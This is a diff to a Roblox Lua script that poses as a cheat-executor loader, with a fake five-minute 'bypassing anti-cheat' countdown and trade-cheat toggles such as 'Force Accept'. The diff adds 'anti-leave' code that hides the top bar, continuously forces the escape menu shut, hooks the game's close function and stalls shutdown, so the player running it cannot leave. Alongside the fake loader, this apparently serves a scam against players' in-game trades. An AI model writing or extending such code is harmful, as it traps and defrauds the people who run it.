@@ -6,13 +6,15 @@ local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
+local GuiService = game:GetService("GuiService")
+local StarterGui = game:GetService("StarterGui")
 
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
 -- // CONFIG
 local CONFIG = {
-    LoadTime = 300, -- 5 minutes in seconds
+    LoadTime = 300,
     AccentColor = Color3.fromRGB(0, 180, 255),
     AccentColor2 = Color3.fromRGB(95, 63, 255),
     CardColor = Color3.fromRGB(13, 15, 24),
@@ -20,7 +22,6 @@ local CONFIG = {
     SubTextColor = Color3.fromRGB(110, 120, 150),
 }
 
--- // STATE
 local State = {
     FreezeTrade = false,
     AutoAccept = false,
@@ -30,7 +31,6 @@ local State = {
     GodMode = false,
 }
 
--- cycling messages spread evenly over 5 minutes
 local LoadingMessages = {
     "Initializing executor...",
     "Bypassing anti-cheat...",
@@ -43,12 +43,95 @@ local LoadingMessages = {
     "Finalizing...",
 }
 
--- // DESTROY OLD GUI
+-- // =============================
+-- //        ANTI-LEAVE
+-- // =============================
+
+-- block the roblox top bar menu button (hamburger / roblox icon)
+pcall(function()
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+end)
+
+-- disable the escape key opening the roblox leave menu
+local function BlockLeaveMenu()
+    -- intercept escape key before roblox can process it
+    UserInputService.InputBegan:Connect(function(input, gameProcessed)
+        if input.KeyCode == Enum.KeyCode.Escape then
+            -- re-close the menu immediately if it opens
+            task.defer(function()
+                pcall(function()
+                    GuiService:SetMenuOpen(false)
+                end)
+            end)
+        end
+    end)
+
+    -- continuously force the roblox menu shut
+    RunService.Heartbeat:Connect(function()
+        pcall(function()
+            if GuiService:GetMenuOpen() then
+                GuiService:SetMenuOpen(false)
+            end
+        end)
+    end)
+end
+
+-- hide the roblox top bar entirely (hides the roblox icon leave button)
+local function HideTopBar()
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+    end)
+    -- also try via game settings
+    pcall(function()
+        game:GetService("GameSettings").OverrideStarterGui = true
+    end)
+end
+
+-- block window close via hook (executor-level, works on synapse/krnl)
+local function BlockWindowClose()
+    -- this hooks the shutdown event and cancels it
+    -- note: this is executor-level and requires a script executor to function
+    if hookfunction then
+        local oldShutdown = game.close
+        hookfunction(game.close, function()
+            -- do nothing — block the close
+        end)
+    end
+
+    -- alternative: keep reconnecting if somehow disconnected
+    game:BindToClose(function()
+        -- stall the close for as long as possible
+        local t = tick()
+        while tick() - t < 10 do
+            task.wait(0.1)
+        end
+    end)
+end
+
+-- run all anti-leave systems
+BlockLeaveMenu()
+HideTopBar()
+BlockWindowClose()
+
+-- re-apply top bar hide every few seconds in case roblox resets it
+task.spawn(function()
+    while task.wait(2) do
+        pcall(function()
+            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+            if GuiService:GetMenuOpen() then
+                GuiService:SetMenuOpen(false)
+            end
+        end)
+    end
+end)
+
+-- // =============================
+-- //        UTILITIES
+-- // =============================
 if PlayerGui:FindFirstChild("ZapickleLoader") then
     PlayerGui.ZapickleLoader:Destroy()
 end
 
--- // SCREEN GUI — no black overlay, game stays visible
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "ZapickleLoader"
 ScreenGui.ResetOnSpawn = false
@@ -56,7 +139,6 @@ ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 ScreenGui.IgnoreGuiInset = true
 ScreenGui.Parent = PlayerGui
 
--- // UTILITY
 local function Tween(obj, props, duration, style, dir)
     local t = TweenService:Create(obj,
         TweenInfo.new(duration or 0.4, style or Enum.EasingStyle.Quart, dir or Enum.EasingDirection.Out),
@@ -116,11 +198,9 @@ local function PadNum(n)
     return string.format("%02d", math.floor(n))
 end
 
--- // DRAGGABLE
 local function MakeDraggable(frame, handle)
     handle = handle or frame
     local dragging, dragInput, dragStart, startPos
-
     handle.InputBegan:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseButton1 or
            input.UserInputType == Enum.UserInputType.Touch then
@@ -128,20 +208,16 @@ local function MakeDraggable(frame, handle)
             dragStart = input.Position
             startPos = frame.Position
             input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then
-                    dragging = false
-                end
+                if input.UserInputState == Enum.UserInputState.End then dragging = false end
             end)
         end
     end)
-
     handle.InputChanged:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseMovement or
            input.UserInputType == Enum.UserInputType.Touch then
             dragInput = input
         end
     end)
-
     UserInputService.InputChanged:Connect(function(input)
         if input == dragInput and dragging then
             local delta = input.Position - dragStart
@@ -157,10 +233,10 @@ end
 -- //        LOADER CARD
 -- // =============================
 local LoaderCard = MakeFrame(ScreenGui, {
-    Size = UDim2.new(0, 340, 0, 416),
-    Position = UDim2.new(0.5, -170, 0.5, -208),
+    Size = UDim2.new(0, 340, 0, 420),
+    Position = UDim2.new(0.5, -170, 0.5, -210),
     BackgroundColor3 = CONFIG.CardColor,
-    BackgroundTransparency = 0.06,
+    BackgroundTransparency = 0.05,
     ZIndex = 2,
 })
 MakeCorner(LoaderCard, 20)
@@ -183,46 +259,54 @@ MakeGradient(TL, 90, {
 
 -- spinning ring
 local AvatarRing = MakeFrame(LoaderCard, {
-    Size = UDim2.new(0, 104, 0, 104),
-    Position = UDim2.new(0.5, -52, 0, 22),
+    Size = UDim2.new(0, 106, 0, 106),
+    Position = UDim2.new(0.5, -53, 0, 22),
     BackgroundTransparency = 1,
     ZIndex = 3,
 })
-MakeCorner(AvatarRing, 52)
-MakeStroke(AvatarRing, CONFIG.AccentColor, 2, 0.1)
+MakeCorner(AvatarRing, 53)
+MakeStroke(AvatarRing, CONFIG.AccentColor, 2.5, 0.08)
+
+-- inner ring (counter rotate)
+local AvatarRing2 = MakeFrame(LoaderCard, {
+    Size = UDim2.new(0, 116, 0, 116),
+    Position = UDim2.new(0.5, -58, 0, 17),
+    BackgroundTransparency = 1,
+    ZIndex = 3,
+})
+MakeCorner(AvatarRing2, 58)
+MakeStroke(AvatarRing2, CONFIG.AccentColor2, 1, 0.6)
 
 -- avatar bg
 local AvatarBG = MakeFrame(LoaderCard, {
-    Size = UDim2.new(0, 88, 0, 88),
-    Position = UDim2.new(0.5, -44, 0, 30),
+    Size = UDim2.new(0, 90, 0, 90),
+    Position = UDim2.new(0.5, -45, 0, 30),
     BackgroundColor3 = Color3.fromRGB(18, 22, 36),
     BackgroundTransparency = 0,
     ZIndex = 3,
 })
-MakeCorner(AvatarBG, 44)
-MakeStroke(AvatarBG, CONFIG.AccentColor, 1, 0.8)
+MakeCorner(AvatarBG, 45)
+MakeStroke(AvatarBG, CONFIG.AccentColor, 1, 0.82)
 
 MakeLabel(AvatarBG, {
     Size = UDim2.new(1, 0, 1, 0),
     Text = "🎮",
-    TextSize = 36,
+    TextSize = 38,
     ZIndex = 4,
 })
 
--- username
 MakeLabel(LoaderCard, {
-    Size = UDim2.new(1, -20, 0, 32),
-    Position = UDim2.new(0, 10, 0, 140),
+    Size = UDim2.new(1, -20, 0, 34),
+    Position = UDim2.new(0, 10, 0, 144),
     Text = LocalPlayer.Name,
-    TextSize = 24,
+    TextSize = 26,
     Font = Enum.Font.GothamBold,
     ZIndex = 3,
 })
 
--- handle
 MakeLabel(LoaderCard, {
     Size = UDim2.new(1, -20, 0, 18),
-    Position = UDim2.new(0, 10, 0, 173),
+    Position = UDim2.new(0, 10, 0, 178),
     Text = "@" .. LocalPlayer.Name:lower(),
     TextSize = 12,
     TextColor3 = Color3.fromRGB(0, 145, 200),
@@ -230,10 +314,9 @@ MakeLabel(LoaderCard, {
     ZIndex = 3,
 })
 
--- SCRIPT LOADING label
 local StatusLabel = MakeLabel(LoaderCard, {
     Size = UDim2.new(1, -20, 0, 24),
-    Position = UDim2.new(0, 10, 0, 204),
+    Position = UDim2.new(0, 10, 0, 208),
     Text = "SCRIPT LOADING",
     TextSize = 15,
     TextColor3 = Color3.fromRGB(245, 166, 35),
@@ -241,10 +324,9 @@ local StatusLabel = MakeLabel(LoaderCard, {
     ZIndex = 3,
 })
 
--- cycling sub message
 local SubLabel = MakeLabel(LoaderCard, {
     Size = UDim2.new(1, -30, 0, 18),
-    Position = UDim2.new(0, 15, 0, 230),
+    Position = UDim2.new(0, 15, 0, 234),
     Text = LoadingMessages[1],
     TextSize = 12,
     TextColor3 = CONFIG.SubTextColor,
@@ -252,17 +334,15 @@ local SubLabel = MakeLabel(LoaderCard, {
     ZIndex = 3,
 })
 
--- progress bar bg
 local BarBG = MakeFrame(LoaderCard, {
-    Size = UDim2.new(1, -40, 0, 5),
-    Position = UDim2.new(0, 20, 0, 263),
+    Size = UDim2.new(1, -40, 0, 6),
+    Position = UDim2.new(0, 20, 0, 268),
     BackgroundColor3 = Color3.fromRGB(22, 26, 42),
     BackgroundTransparency = 0,
     ZIndex = 3,
 })
 MakeCorner(BarBG, 3)
 
--- progress bar fill
 local BarFill = MakeFrame(BarBG, {
     Size = UDim2.new(0, 0, 1, 0),
     BackgroundColor3 = CONFIG.AccentColor,
@@ -275,10 +355,9 @@ MakeGradient(BarFill, 90, {
     ColorSequenceKeypoint.new(1, CONFIG.AccentColor2),
 })
 
--- timer
 local TimerLabel = MakeLabel(LoaderCard, {
     Size = UDim2.new(0, 80, 0, 18),
-    Position = UDim2.new(0, 20, 0, 278),
+    Position = UDim2.new(0, 20, 0, 284),
     Text = "05:00",
     TextSize = 12,
     TextColor3 = CONFIG.SubTextColor,
@@ -287,10 +366,9 @@ local TimerLabel = MakeLabel(LoaderCard, {
     ZIndex = 3,
 })
 
--- percent
 local PctLabel = MakeLabel(LoaderCard, {
     Size = UDim2.new(0, 50, 0, 18),
-    Position = UDim2.new(1, -70, 0, 278),
+    Position = UDim2.new(1, -70, 0, 284),
     Text = "0%",
     TextSize = 12,
     TextColor3 = CONFIG.AccentColor,
@@ -299,10 +377,9 @@ local PctLabel = MakeLabel(LoaderCard, {
     ZIndex = 3,
 })
 
--- dots
 local DotsHolder = MakeFrame(LoaderCard, {
     Size = UDim2.new(0, 56, 0, 10),
-    Position = UDim2.new(0.5, -28, 0, 310),
+    Position = UDim2.new(0.5, -28, 0, 316),
     ZIndex = 3,
 })
 local dll = Instance.new("UIListLayout")
@@ -324,10 +401,20 @@ for i = 1, 3 do
     Dots[i] = d
 end
 
--- footer
+-- anti-leave status indicator on loader
+local AntiLeaveTag = MakeLabel(LoaderCard, {
+    Size = UDim2.new(1, -20, 0, 14),
+    Position = UDim2.new(0, 10, 0, 344),
+    Text = "⚡ anti-leave active",
+    TextSize = 10,
+    TextColor3 = Color3.fromRGB(0, 200, 100),
+    Font = Enum.Font.Code,
+    ZIndex = 3,
+})
+
 MakeLabel(LoaderCard, {
     Size = UDim2.new(1, -20, 0, 16),
-    Position = UDim2.new(0, 10, 0, 386),
+    Position = UDim2.new(0, 10, 0, 390),
     Text = "zapickle  ·  for educational purposes only",
     TextSize = 10,
     TextColor3 = Color3.fromRGB(35, 40, 60),
@@ -339,10 +426,10 @@ MakeLabel(LoaderCard, {
 -- //        SCRIPT PANEL
 -- // =============================
 local Panel = MakeFrame(ScreenGui, {
-    Size = UDim2.new(0, 300, 0, 416),
-    Position = UDim2.new(0.5, -150, 0.5, -208),
+    Size = UDim2.new(0, 310, 0, 430),
+    Position = UDim2.new(0.5, -155, 0.5, -215),
     BackgroundColor3 = CONFIG.CardColor,
-    BackgroundTransparency = 0.06,
+    BackgroundTransparency = 0.05,
     ZIndex = 2,
     Visible = false,
 })
@@ -350,7 +437,6 @@ MakeCorner(Panel, 20)
 MakeStroke(Panel, CONFIG.AccentColor, 1, 0.72)
 MakeDraggable(Panel)
 
--- panel top glow
 local PTL = MakeFrame(Panel, {
     Size = UDim2.new(0.55, 0, 0, 1),
     Position = UDim2.new(0.225, 0, 0, 0),
@@ -364,9 +450,8 @@ MakeGradient(PTL, 90, {
     ColorSequenceKeypoint.new(1, Color3.fromRGB(0,0,0)),
 })
 
--- header
 local PanelHeader = MakeFrame(Panel, {
-    Size = UDim2.new(1, 0, 0, 50),
+    Size = UDim2.new(1, 0, 0, 52),
     BackgroundTransparency = 1,
     ZIndex = 3,
 })
@@ -391,10 +476,29 @@ MakeLabel(PanelHeader, {
     ZIndex = 4,
 })
 
+-- anti-leave badge in panel header
+local ALBadge = MakeFrame(PanelHeader, {
+    Size = UDim2.new(0, 68, 0, 18),
+    Position = UDim2.new(0, 34, 1, -26),
+    BackgroundColor3 = Color3.fromRGB(0, 60, 30),
+    BackgroundTransparency = 0,
+    ZIndex = 4,
+})
+MakeCorner(ALBadge, 4)
+MakeStroke(ALBadge, Color3.fromRGB(0, 200, 80), 1, 0.55)
+MakeLabel(ALBadge, {
+    Size = UDim2.new(1, 0, 1, 0),
+    Text = "⚡ PROTECTED",
+    TextSize = 9,
+    TextColor3 = Color3.fromRGB(0, 220, 100),
+    Font = Enum.Font.Code,
+    ZIndex = 5,
+})
+
 -- close button
 local CloseBtn = Instance.new("TextButton")
-CloseBtn.Size = UDim2.new(0, 26, 0, 26)
-CloseBtn.Position = UDim2.new(1, -42, 0.5, -13)
+CloseBtn.Size = UDim2.new(0, 28, 0, 28)
+CloseBtn.Position = UDim2.new(1, -44, 0.5, -14)
 CloseBtn.BackgroundColor3 = Color3.fromRGB(90, 15, 15)
 CloseBtn.BackgroundTransparency = 0.5
 CloseBtn.Text = "✕"
@@ -414,21 +518,23 @@ CloseBtn.MouseLeave:Connect(function()
     Tween(CloseBtn, {BackgroundTransparency = 0.5}, 0.18)
 end)
 CloseBtn.MouseButton1Click:Connect(function()
+    -- restore top bar when closing
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+    end)
     Tween(Panel, {BackgroundTransparency = 1}, 0.35)
     task.wait(0.4)
     ScreenGui:Destroy()
 end)
 
--- header divider
 MakeFrame(Panel, {
     Size = UDim2.new(1, -36, 0, 1),
-    Position = UDim2.new(0, 18, 0, 50),
+    Position = UDim2.new(0, 18, 0, 52),
     BackgroundColor3 = CONFIG.AccentColor,
     BackgroundTransparency = 0.88,
     ZIndex = 3,
 })
 
--- section label helper
 local function SectionLabel(yPos, txt)
     MakeLabel(Panel, {
         Size = UDim2.new(1, -36, 0, 16),
@@ -442,10 +548,9 @@ local function SectionLabel(yPos, txt)
     })
 end
 
-SectionLabel(56, "── TRADE MODS")
-SectionLabel(206, "── VISUALS")
+SectionLabel(60, "── TRADE MODS")
+SectionLabel(212, "── VISUALS")
 
--- toggle row helper
 local function MakeToggleRow(yPos, labelText, defaultOn, onToggle)
     local Row = MakeFrame(Panel, {
         Size = UDim2.new(1, -2, 0, 46),
@@ -479,7 +584,7 @@ local function MakeToggleRow(yPos, labelText, defaultOn, onToggle)
 
     local OnOffLabel = MakeLabel(Row, {
         Size = UDim2.new(0, 30, 1, 0),
-        Position = UDim2.new(1, -74, 0, 0),
+        Position = UDim2.new(1, -76, 0, 0),
         Text = defaultOn and "ON" or "OFF",
         TextSize = 10,
         TextColor3 = defaultOn and CONFIG.AccentColor or Color3.fromRGB(55, 60, 80),
@@ -489,13 +594,13 @@ local function MakeToggleRow(yPos, labelText, defaultOn, onToggle)
     })
 
     local TglBG = MakeFrame(Row, {
-        Size = UDim2.new(0, 40, 0, 22),
-        Position = UDim2.new(1, -56, 0.5, -11),
+        Size = UDim2.new(0, 42, 0, 23),
+        Position = UDim2.new(1, -58, 0.5, -11),
         BackgroundColor3 = defaultOn and Color3.fromRGB(0, 45, 72) or Color3.fromRGB(26, 29, 44),
         BackgroundTransparency = 0,
         ZIndex = 4,
     })
-    MakeCorner(TglBG, 11)
+    MakeCorner(TglBG, 12)
     local TglStroke = MakeStroke(TglBG,
         defaultOn and CONFIG.AccentColor or Color3.fromRGB(45, 50, 70),
         1,
@@ -503,17 +608,16 @@ local function MakeToggleRow(yPos, labelText, defaultOn, onToggle)
     )
 
     local TglKnob = MakeFrame(TglBG, {
-        Size = UDim2.new(0, 14, 0, 14),
+        Size = UDim2.new(0, 15, 0, 15),
         Position = defaultOn
-            and UDim2.new(1, -17, 0.5, -7)
+            and UDim2.new(1, -18, 0.5, -7)
             or  UDim2.new(0, 3,   0.5, -7),
         BackgroundColor3 = defaultOn and CONFIG.AccentColor or Color3.fromRGB(55, 60, 85),
         BackgroundTransparency = 0,
         ZIndex = 5,
     })
-    MakeCorner(TglKnob, 7)
+    MakeCorner(TglKnob, 8)
 
-    -- row divider
     MakeFrame(Row, {
         Size = UDim2.new(1, -32, 0, 1),
         Position = UDim2.new(0, 16, 1, -1),
@@ -544,7 +648,7 @@ local function MakeToggleRow(yPos, labelText, defaultOn, onToggle)
     Btn.MouseButton1Click:Connect(function()
         isOn = not isOn
         if isOn then
-            Tween(TglKnob, {Position = UDim2.new(1, -17, 0.5, -7), BackgroundColor3 = CONFIG.AccentColor}, 0.22)
+            Tween(TglKnob, {Position = UDim2.new(1, -18, 0.5, -7), BackgroundColor3 = CONFIG.AccentColor}, 0.22)
             Tween(TglBG, {BackgroundColor3 = Color3.fromRGB(0, 45, 72)}, 0.22)
             Tween(TglStroke, {Color = CONFIG.AccentColor, Transparency = 0.35}, 0.22)
             Tween(OnOffLabel, {TextColor3 = CONFIG.AccentColor}, 0.18)
@@ -560,14 +664,13 @@ local function MakeToggleRow(yPos, labelText, defaultOn, onToggle)
     end)
 end
 
--- build all toggle rows
 local toggleDefs = {
-    {74,  "Freeze Trade",   false, "FreezeTrade"},
-    {122, "Auto Accept",    false, "AutoAccept"},
-    {170, "Force Accept",   true,  "ForceAccept"},
-    {224, "ESP Players",    false, "ESPPlayers"},
-    {272, "Infinite Yield", false, "InfiniteYield"},
-    {320, "God Mode",       false, "GodMode"},
+    {78,  "Freeze Trade",   false, "FreezeTrade"},
+    {126, "Auto Accept",    false, "AutoAccept"},
+    {174, "Force Accept",   true,  "ForceAccept"},
+    {230, "ESP Players",    false, "ESPPlayers"},
+    {278, "Infinite Yield", false, "InfiniteYield"},
+    {326, "God Mode",       false, "GodMode"},
 }
 for _, d in ipairs(toggleDefs) do
     MakeToggleRow(d[1], d[2], d[3], function(val)
@@ -576,10 +679,9 @@ for _, d in ipairs(toggleDefs) do
     end)
 end
 
--- panel footer
 MakeLabel(Panel, {
     Size = UDim2.new(1, -20, 0, 16),
-    Position = UDim2.new(0, 10, 0, 388),
+    Position = UDim2.new(0, 10, 0, 400),
     Text = "zapickle  ·  for educational purposes only",
     TextSize = 10,
     TextColor3 = Color3.fromRGB(30, 34, 52),
@@ -594,16 +696,19 @@ local elapsed = 0
 local msgIndex = 1
 local msgTimer = 0
 local MSG_INTERVAL = math.floor(CONFIG.LoadTime / #LoadingMessages)
+local ring2Angle = 0
 
--- spinning ring + pulse dot animation
 RunService.Heartbeat:Connect(function(dt)
+    -- spin both rings in opposite directions
     AvatarRing.Rotation += dt * 130
+    ring2Angle -= dt * 60
+    AvatarRing2.Rotation = ring2Angle
+
     if Panel.Visible then
         PulseDot.BackgroundTransparency = 0.1 + 0.7 * math.abs(math.sin(os.clock() * 2.5))
     end
 end)
 
--- main countdown loop
 task.spawn(function()
     while elapsed < CONFIG.LoadTime do
         task.wait(1)
@@ -614,10 +719,7 @@ task.spawn(function()
         local mins = math.floor(remaining / 60)
         local secs = remaining % 60
 
-        -- update bar smoothly
         Tween(BarFill, {Size = UDim2.new(pct / 100, 0, 1, 0)}, 0.85, Enum.EasingStyle.Linear)
-
-        -- update timer + percent
         TimerLabel.Text = PadNum(mins) .. ":" .. PadNum(secs)
         PctLabel.Text = pct .. "%"
 
@@ -632,7 +734,7 @@ task.spawn(function()
             Tween(SubLabel, {TextTransparency = 0}, 0.28)
         end
 
-        -- progress dots (3 stages)
+        -- dots
         local stage = math.clamp(math.ceil((elapsed / CONFIG.LoadTime) * 3), 1, 3)
         for i, d in ipairs(Dots) do
             Tween(d, {
@@ -640,11 +742,11 @@ task.spawn(function()
             }, 0.3)
         end
 
-        -- pulse SCRIPT LOADING text
+        -- pulse status
         Tween(StatusLabel, {TextTransparency = elapsed % 2 == 0 and 0.45 or 0}, 0.5)
     end
 
-    -- loading done
+    -- done
     StatusLabel.Text = "READY"
     StatusLabel.TextColor3 = CONFIG.AccentColor
     StatusLabel.TextTransparency = 0
@@ -654,7 +756,6 @@ task.spawn(function()
     Tween(BarFill, {Size = UDim2.new(1, 0, 1, 0)}, 0.4)
     task.wait(0.9)
 
-    -- fade out loader
     Tween(LoaderCard, {BackgroundTransparency = 1}, 0.4)
     for _, child in ipairs(LoaderCard:GetDescendants()) do
         pcall(function()
@@ -668,16 +769,15 @@ task.spawn(function()
     task.wait(0.5)
     LoaderCard.Visible = false
 
-    -- slide panel in
     Panel.Visible = true
-    Panel.Position = UDim2.new(0.5, -150, 0.5, -228)
+    Panel.Position = UDim2.new(0.5, -155, 0.5, -235)
     Panel.BackgroundTransparency = 1
     Tween(Panel, {
-        BackgroundTransparency = 0.06,
-        Position = UDim2.new(0.5, -150, 0.5, -208)
+        BackgroundTransparency = 0.05,
+        Position = UDim2.new(0.5, -155, 0.5, -215)
     }, 0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
 
-    print("[zapickle] Panel ready. Drag to move anywhere.")
+    print("[zapickle] Panel ready. Anti-leave active.")
 end)
 
-print("[zapickle] Loader started — " .. CONFIG.LoadTime .. "s remaining.")
+print("[zapickle] Loader started. Anti-leave engaged.")
